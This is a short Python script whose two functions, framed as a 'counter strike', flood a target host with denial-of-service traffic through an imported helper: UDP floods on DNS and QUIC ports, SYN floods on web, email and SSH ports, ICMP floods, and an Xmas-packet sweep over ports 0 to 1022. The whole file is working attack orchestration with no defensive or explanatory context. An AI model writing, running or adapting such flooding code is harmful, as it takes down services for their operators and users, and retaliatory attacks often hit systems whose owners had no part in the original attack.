import counter_strike_helper
def full_scale_counter_strike(target):
    counter_strike_helper.attack_UDP("UDP-Mix",target,53,300) # DNS
    counter_strike_helper.attack_UDP("UDP-Mix", target, 443, 300) # QUIC
    counter_strike_helper.synflood(target,80,200) # HTTP
    counter_strike_helper.synflood(target, 443, 200) # HTTPS
    counter_strike_helper.synflood(target, 25, 200) # Email
    counter_strike_helper.synflood(target, 587, 200) # Email
    counter_strike_helper.synflood(target, 465, 200) # Email
    counter_strike_helper.synflood(target, 143, 200) # Email
    counter_strike_helper.synflood(target, 993, 200) # Email
    counter_strike_helper.synflood(target, 22, 200) # SSH
    counter_strike_helper.icmpflood(target,200) # ICMP
    for port in range(0,1023): # xmas flood
        counter_strike_helper.xmasflood(target,port,50)

def fast_counter_strike(target):
    counter_strike_helper.attack_UDP("UDP-Mix", target, 53, 60)  # DNS
    counter_strike_helper.synflood(target, 80, 100)  # HTTP
    counter_strike_helper.synflood(target, 443, 100)  # HTTPS
    counter_strike_helper.synflood(target, 25, 100)  # Email
    counter_strike_helper.synflood(target, 587, 100)  # Email
    counter_strike_helper.icmpflood(target, 80) # ICMP


